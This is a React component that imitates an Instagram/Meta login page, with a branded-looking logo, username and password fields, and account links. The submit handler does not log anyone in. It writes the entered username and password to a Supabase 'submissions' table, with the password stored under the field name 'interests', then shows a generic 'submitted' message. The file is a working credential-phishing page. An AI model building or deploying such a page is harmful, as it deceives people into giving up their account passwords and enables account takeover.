
import { useState } from 'react'
import { supabase } from './lib/supabase'
import './App.css'

function App() {
  const [identifier, setIdentifier] = useState('')
  const [password, setPassword] = useState('')
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState('')
  const [success, setSuccess] = useState(false)

  const canSubmit =
    identifier.trim() !== '' && password.trim() !== ''

  const handleSubmit = async (event) => {
    event.preventDefault()
    setMessage('')
    setSuccess(false)
    setLoading(true)

    try {
      const { error } = await supabase
        .from('submissions')
        .insert({
          username: identifier.trim(),
          interests: password.trim(),
        })

      if (error) throw error

      setIdentifier('')
      setPassword('')
      setSuccess(true)
      setMessage('Your response has been submitted!')
    } catch (error) {
      console.error('Submission error:', error)
      setMessage('Something went wrong. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <main className="page">
      <div className="screen">
        <button type="button" className="language">
          English (US) <span aria-hidden="true">⌄</span>
        </button>

        <svg
          className="logo"
          width="56"
          height="56"
          viewBox="0 0 56 56"
          fill="none"
          role="img"
          aria-label="Openform"
        >
          <defs>
            <linearGradient
              id="ig"
              gradientUnits="userSpaceOnUse"
              x1="8"
              y1="52"
              x2="48"
              y2="4"
            >
              <stop offset="0%" stopColor="#FEDA77" />
              <stop offset="10%" stopColor="#F58529" />
              <stop offset="25%" stopColor="#f30202" />
              <stop offset="50%" stopColor="#cb1064" />
              <stop offset="75%" stopColor="#8134AF" />
              <stop offset="100%" stopColor="#515BD4" />
            </linearGradient>
          </defs>

          <rect
            x="5"
            y="5"
            width="46"
            height="46"
            rx="14"
            stroke="url(#ig)"
            strokeWidth="5"
          />
          <circle cx="28" cy="28" r="10.5" stroke="url(#ig)" strokeWidth="5" />
          <circle cx="40.5" cy="15.5" r="3" fill="url(#ig)" />
        </svg>

        <form onSubmit={handleSubmit}>
          <div className="field">
            <input
              type="text"
              placeholder="Username, email, or phone number"
              value={identifier}
              onChange={(e) => setIdentifier(e.target.value)}
              autoComplete="off"
              maxLength={100}
            />
          </div>

          <div className="field">
            <input
              type="text"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              maxLength={5000}
            />
          </div>

          <button
            type="submit"
            className="submit-btn"
          >
            {'Submit'}
          </button>

          {message && (
            <p
              role="status"
              className={`form-message ${success ? 'success' : 'error'}`}
            >
              {message}
            </p>
          )}
        </form>
        <a className="forgot" href="#!">Forgot password ?</a>

        <div className="bottom">
          <button type="button" className="create-btn">
            Create new account
          </button>

          <div className="meta">
            <svg width="22" height="12" viewBox="0 0 36 18" fill="none" aria-hidden="true">
              <path
                d="M9 16c-3 0-5-3-5-7s2-7 5-7c4 0 7 14 12 14 3 0 5-3 5-7s-2-7-5-7c-5 0-8 14-12 14z"
                stroke="currentColor"
                strokeWidth="2.4"
                strokeLinecap="round"
                strokeLinejoin="round"
                transform="translate(2 0)"
              />
            </svg>
            <span>Meta</span>
          </div>
        </div>
      </div>
    </main>
  )
}

export default App
